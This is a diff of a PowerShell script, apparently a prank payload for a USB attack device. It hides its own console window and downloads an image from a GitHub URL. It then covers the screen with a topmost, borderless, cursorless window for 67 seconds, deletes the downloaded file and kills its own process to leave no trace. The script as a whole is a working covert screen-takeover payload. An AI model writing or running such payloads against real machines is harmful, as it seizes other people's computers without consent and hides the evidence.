@@ -1,4 +1,4 @@
-# 1. Hide console window immediately
+# 1. hide console window immediately
 try {
     $c = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
     $t = Add-Type -MemberDefinition $c -Name "W" -Namespace "Win" -PassThru
@@ -8,38 +8,51 @@ try {
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase
 
-# 2. Settings
+# 2. settings
 $u = 'https://github.com/ymkeee/T-Embed/raw/refs/heads/main/image.png'
 $f = "$env:TEMP\image.png"
 
 try {
-    # Download video
+    # download image
     Invoke-WebRequest -Uri $u -OutFile $f -ErrorAction Stop
 
-    # 3. Create Player UI
+    # 3. create player ui with image and timer
     $xaml = @"
 <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         WindowStyle="None" WindowState="Maximized" Topmost="True" 
-        Background="Black" Cursor="None" ShowInTaskbar="False">
-    <Grid><MediaElement Name="v" Source="$f" LoadedBehavior="Play" Stretch="Uniform" /></Grid>
+        Background="Black" Cursor="None" ShowInTaskbar="False"
+        Loaded="Window_Loaded">
+    <Grid>
+        <Image Name="img" Source="$f" Stretch="Uniform" />
+    </Grid>
 </Window>
 "@
 
     $reader = New-Object System.Xml.XmlNodeReader ([xml]$xaml)
     $w = [Windows.Markup.XamlReader]::Load($reader)
-    $v = $w.FindName("v")
+    $img = $w.FindName("img")
 
-    # Close window when video ends
-    $v.add_MediaEnded({
+    # add timer for 67 seconds
+    $timer = New-Object System.Windows.Threading.DispatcherTimer
+    $timer.Interval = [TimeSpan]::FromSeconds(67)
+    $timer.Add_Tick({
         $w.Close()
+        $timer.Stop()
     })
+    $timer.Start()
 
-    # Show the window
+    # event for loaded
+    $loadedEvent = {
+        $timer.Start()
+    }
+    $w.Add_Loaded($loadedEvent)
+
+    # show the window
     $w.ShowDialog() | Out-Null
 } 
 catch { exit }
 finally {
-    # 4. Cleanup and self-destruct process
+    # 4. cleanup and self-destruct process
     if (Test-Path $f) { Remove-Item $f -Force -ErrorAction SilentlyContinue }
     Stop-Process -Id $pid -Force
 }
